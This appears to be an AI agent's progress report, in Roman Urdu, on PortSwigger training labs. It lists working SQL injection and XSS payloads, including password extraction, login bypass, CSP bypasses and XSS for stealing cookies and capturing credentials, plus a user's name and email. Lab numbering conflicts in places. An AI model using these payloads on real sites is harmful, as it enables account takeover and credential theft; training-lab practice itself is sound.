# PortSwigger Labs — Progress Report (15 Nov 2026, updated 20 Nov 2026 ~12:50 PKT)

**Total: 42 / 48 labs solved aur verify hue** (SQL Injection 13/18, XSS 29/30). 272-lab plan mein total 42 / 272.
Kaam 15 Nov ~14:00–18:25 PKT chala, PortSwigger account "Arbaz Ahmed Naveed" (arbazchuahan@gmail.com) se signed in.
Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal labs, permission wala tareeqa.

## SQL Injection — 13 solved

1. **WHERE clause, hidden data** — `Gifts' OR 1=1--` — saare 20 products mile, jin mein 8 unreleased bhi the. Kyun: `OR 1=1` har row ke liye true ho jata hai.
2. **Login bypass** — username `administrator'--`, password `x` — admin login ho gaya. Kyun: `--` ke baad password check comment ho jata hai.
3. **Oracle version** — `Gifts' UNION SELECT banner, NULL FROM v$version--` — "Oracle Database 11g Express Edition Release 11.2.0.2.0" mila. Kyun: UNION version wali rows ko result mein le aata hai.
4. **MySQL/Microsoft version** — `Gifts' UNION SELECT @@version, NULL-- ` (aakhir mein space zaroori) — "8.0.42-0ubuntu0.20.04.1" mila. Kyun: `@@version` MySQL ka version deta hai.
5. **Non-Oracle DB contents** — pehle `information_schema.tables/columns` se users table dhoondha, phir `Gifts' UNION SELECT username_kttagt, password_qwpqpr FROM users_vvbeiz--` — admin password mila, login ho gaya. Kyun: information_schema database ki apni tables aur columns batata hai.
6. **Oracle DB contents** — `all_tables/all_tab_columns` se structure dhoondha, phir `Gifts' UNION SELECT USERNAME_TTIDXF, PASSWORD_TKNTFR FROM USERS_DCAWFW--` — admin password mila. Kyun: Oracle ke ye views database ka structure batate hain.
7. **UNION, columns ki tadad** — `Gifts' UNION SELECT NULL,NULL,NULL--` — solved. Kyun: NULLs ki tadad query ke 3 columns ke barabar thi.
8. **UNION, text wala column** — `Gifts' UNION SELECT NULL, 's91gAp', NULL--` — text nazar aaya. Kyun: doosra column text wala hai, string wahin dikhti hai.
9. **UNION, doosri table se data** — `Gifts' UNION SELECT username, password FROM users--` — admin password mila. Kyun: UNION alag table ka data bhi result mein le aata hai.
10. **UNION, ek column mein do values** — `Gifts' UNION SELECT NULL, username||'~'||password FROM users--` — `administrator~t17x3ik9re6kgfqm5v5g` mila. Kyun: `||` username aur password ko jor deta hai.
11. **XML encoding filter bypass (Lab 18)** — is account par pehle se Solved tha; dobara nahi kiya.
12. **Blind SQL injection with conditional responses (Lab 11)** — SOLVED 18 Nov ~01:02 PKT. TrackingId cookie mein OR-form payload se 'Welcome back' signal (true/false) se admin password nikala (20 characters, binary search ek ek character), phir login form ka CSRF token le kar administrator login ho gaya, lab Solved. Kyun: OR wali condition true hone par page 'Welcome back' dikhata hai, false par nahi — isi signal se password nikala jata hai. (AND-form kaam nahi karta kyunki TrackingId 'x' exist nahi karta; browser se cookie edit nahi ho saki, is liye script se solve hua — Burp Repeater mein yahi steps haath se hote hain.)
13. **Blind SQL injection with conditional errors (Lab 12)** — SOLVED 18 Nov ~18:33 PKT. Is lab mein signal error page tha: condition sahi ho to server error page dikhata hai, galat ho to normal page — `CASE WHEN (condition) THEN 1/0 ELSE 'a' END` wala tareeqa. Isi farq se ek ek character kar ke admin ka password nikala, phir login ho gaya, lab Solved. Kyun: `1/0` (zero se divide) sirf tab error deta hai jab condition true ho, is liye error aana = true, normal page = false. (Lab 11 se farq: wahan signal 'Welcome back' tha, yahan error page hai.)

## Cross-Site Scripting (XSS) — 29 solved

1. **Reflected XSS, HTML, nothing encoded** — `/?search=<script>alert(1)</script>` — alert chala. Kyun: search term bina encoding ke page mein aa jata hai.
2. **Stored XSS, HTML, nothing encoded** — comment `<script>alert(1)</script>` — submit karte hi solved. Kyun: comment save ho kar HTML ki tarah dikhaya jata hai.
3. **DOM XSS, document.write** — `/?search="><svg onload=alert(1)>` — alert chala. Kyun: search term `<img src="...">` ke andar likha jata hai, `">` se bahar nikal aata hai.
4. **DOM XSS, innerHTML** — `/?search=<svg onload=alert(1)>` — alert chala. Kyun: innerHTML se SVG banta hai aur onload chalta hai.
5. **DOM XSS, jQuery href** — `/feedback?returnPath=javascript:alert(document.cookie)`, phir "Back" link click — alert chala. Kyun: jQuery Back link ka href returnPath se lagata hai.
6. **DOM XSS, jQuery selector, hashchange** — exploit-server iframe, hash `#<img src=x onerror=print()>` — print chala. Kyun: hash badalne se handler chalta hai aur `$()` img banata hai.
7. **Reflected XSS, attribute, angle brackets encoded** — `/?search=" autofocus onfocus=alert(1) x="` — alert chala. Kyun: angle brackets encode hain lekin double-quote nahi, is liye attribute se bahar nikal kar onfocus lag gaya.
8. **Stored XSS, anchor href, double quotes encoded** — comment ki website `javascript:alert(1)` — submit par solved. Kyun: author ka naam us website se link hota hai.
9. **Reflected XSS, JavaScript string, angle brackets encoded** — `/?search='-alert(1)-'` — alert chala. Kyun: `'` se string band hoti hai aur `-alert(1)-` code ban jata hai.
10. **DOM XSS, document.write, select element** — `</option></select><img src=x onerror=alert(1)>` via storeId — solved. Kyun: value `<select><option>` ke andar likhi jati hai, dono tags band karne parte hain.
11. **DOM XSS, AngularJS expression** — `/?search={{$on.constructor('alert(1)')()}}` — alert chala. Kyun: search term AngularJS expression ki tarah evaluate hota hai.
12. **Reflected DOM XSS** — `/?search=\"-alert(1)}//` — alert chala. Kyun: backslash-quote JSON string se bahar nikalta hai aur `eval()` code chalata hai.
13. **Stored DOM XSS** — comment `<><img src=1 onerror=alert(1)>` — dobara dekhne par alert chala. Kyun: pehla `<>` sanitizer ki encoding kha jata hai, asal img bach jata hai.
14. **Reflected XSS, most tags blocked** — exploit-server iframe `?search="><body onresize=print()>` + iframe resize — Solved. Kyun: injected body asal body se mil jata hai aur resize par onresize chalta hai.
15. **Reflected XSS, all tags blocked except custom ones — SOLVED (18:12 UTC verify).** Payload `<xss id=x onfocus=alert(document.cookie) tabindex=0>` + `#x`. Kyun: custom `<xss>` tag filter se guzar jata hai, `#x` us par focus karta hai aur onfocus chalta hai.
16. **Reflected XSS, some SVG markup allowed** — `<svg><animatetransform onbegin=alert(document.domain)>` — alert chala. Kyun: SVG tags aur events block nahi hain, animation ka onbegin alert chalata hai.
17. **Reflected XSS, canonical link tag** — URL `?%27accesskey=%27x%27onclick=%27alert(document.domain)`, phir Alt+X — alert chala. Kyun: quote canonical link ke href se bahar nikalta hai aur accesskey + onclick lagata hai.
18. **Reflected XSS, JS string, single quote + backslash escaped** — `</script><script>alert(document.domain)</script>` — alert chala. Kyun: sirf quotes aur backslash escape hain, script tag band karke string context se bahar nikal jate hain.
19. **Reflected XSS, JS string, angle brackets + double quotes encoded, single quotes escaped** — `\'-alert(document.domain)//` — alert chala. Kyun: backslash escape nahi hota, app ka backslash + payload ka backslash `\\` ban jata hai aur quote string band kar deta hai.
20. **Stored XSS, onclick event, angle brackets + double quotes encoded, single quotes + backslash escaped** — comment ki Website field: `http://foo?&apos;-alert(document.domain)-&apos;` — solved. Kyun: `&apos;` onclick attribute parse hote waqt quote ban jata hai.
21. **Reflected XSS, template literal** — `${alert(document.domain)}` — alert chala. Kyun: template literal ke andar expression evaluate hota hai.
22. **Exploiting XSS to steal cookies** — stored comment ne victim se uska session cookie comment ki tarah post karwaya, phir woh cookie values apne browser mein lagakar admin account khul gaya. Kyun: stored XSS victim ke browser se uska cookie nikalwata hai.
23. **Exploiting XSS to capture passwords** — fake login form wala comment; victim ne admin credentials type kiye aur woh comment mein aa gaye, un se login ho gaya. Kyun: fake form victim ko credentials type karwata hai.
24. **Exploiting XSS to bypass CSRF defenses** — stored script ne victim ke account page se CSRF token padha aur usi token se email-change request bhej di. Kyun: script victim ke browser mein chal kar uska token use karta hai.
25. **Reflected XSS, AngularJS sandbox escape without strings** — `toString().constructor.prototype.charAt=[].join` + orderBy/fromCharCode se `x=alert(1)` banaya — alert chala. Kyun: charAt overwrite karke sandbox check bypass hota hai, fromCharCode bina string ke code banata hai.
26. **Reflected XSS, AngularJS sandbox escape and CSP** — exploit-server redirect + `#x` focus, ng-focus handler, orderBy `$event.composedPath()` se window tak pahunch kar alert chalaya. Kyun: focus ng-focus chalata hai (CSP bypass) aur composedPath window object deta hai.
27. **Reflected XSS, event handlers + href blocked** — `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>` — alert chala. Kyun: animate na event handler hai na href attribute, is liye filter se guzar jata hai.
28. **Reflected XSS, JavaScript URL, some characters blocked** — `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'` + "Back to blog" click — alert(1337) chala. Kyun: JS string/object se bahar nikal kar arrow function throw karta hai aur window.toString set hota hai.
29. **Reflected XSS protected by CSP, with CSP bypass — SOLVED (18:25 PKT verify).** Payload: search=`<script>alert(1)</script>` + token=`;script-src-elem 'unsafe-inline'`. Kyun: CSP ka report-uri token parameter ko reflect karta hai, is liye token mein semicolon se naya script-src-elem rule lag gaya aur inline script chal gaya. (Pehle CSP injection search mein daala tha — woh galat tha; token hi report-uri mein jata hai.)
30. **Reflected XSS protected by very strict CSP, with dangling markup attack — NOT SOLVED (18:25 PKT).** Exploit banaya aur deliver kiya — victim ne CSRF token bhi bhej diya — lekin victim ka email change kabhi complete nahi hua aur lab "Solved" nahi hua. Dobara delivery bhi ki, wahi result. Ye lab **aap ke ek click** ki zaroorat rakhta hai: browser mein Lab 29 ke exploit server tab par khud "Deliver exploit to victim" dabana hai.

## Kahan ruka aur kyun

- **XSS Lab 29** ("Reflected XSS protected by very strict CSP, with dangling markup attack") — NOT SOLVED. Exploit banaya aur do dafa deliver kiya — victim ne CSRF token bhi bheja — lekin victim ka email change kabhi complete nahi hua, lab "Solved" nahi hua. Ab ye **aap ke ek click** par hai: browser mein Lab 29 ke exploit server tab par khud "Deliver exploit to victim" dabayen. Agar woh bhi na ho, to exploit ka doosra stage (leaked token se email change) dobara banana hoga.
- **SQLi Labs 13–17 (5 blind labs)** — in mein `TrackingId` cookie badalni parti hai; browser se cookie edit nahi hoti. Lab 11 aur Lab 12 isi tareeqe se 18 Nov ko script se solve ho gaye (Lab 12: error-page signal + CSRF login); baaki 5 Burp Suite se honge ya usi script tareeqe se. Naam: Visible error-based SQL injection (Lab 13 — practical solver nahi chal sakta, sirf concept sikhaya ja sakta hai); Blind SQL injection with time delays (Lab 14 — fresh instance mila lekin har probe request time out ho gayi, retry aap ke go-ahead ka wait kar raha hai); Blind SQL injection with time delays and information retrieval; Blind SQL injection with out-of-band interaction; Blind SQL injection with out-of-band data exfiltration.

## Baaki kaam

1. Lab 29 — aap ka ek click (exploit server tab par "Deliver exploit to victim").
2. Blind SQLi 13–17 (5 labs) — Burp Suite se ya script se, seekhne ke saath; Lab 11 aur Lab 12 ho gaye, agla Lab 13 hai (concept only) aur Lab 14 ka retry go-ahead ka wait kar raha hai.
3. Har step ke baad ye file GitHub par update hoti rahegi.
